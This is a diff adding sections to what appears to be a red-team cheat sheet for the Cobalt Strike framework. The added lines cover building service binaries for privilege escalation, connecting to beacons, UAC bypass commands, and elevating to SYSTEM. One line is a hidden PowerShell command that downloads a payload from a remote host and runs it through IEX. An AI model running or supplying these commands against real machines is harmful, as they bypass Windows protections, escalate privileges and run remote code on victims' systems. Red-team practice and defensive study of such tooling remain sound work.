@@ -20,3 +20,26 @@ cd /opt/cobaltstrike
 ```
 execute-assembly <PATH TO EXE> -group=system
 ```
+
+#### Create service binary
+- Used for privilege escalation with services
+- Attacks --> Packages --> Windows Executable (S) and selecting the Service Binary output type.
+- TIP:  I recommend the use of TCP beacons bound to localhost only with privilege escalations
+
+#### Connect to beacon
+```
+connect <IP> <PORT>
+```
+
+#### UAC bypass
+````
+elevate uac-token-duplication tcp-4444-local
+
+runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
+connect localhost 4444
+```
+
+####  elevate to system
+```
+elevate svc-exe
+```
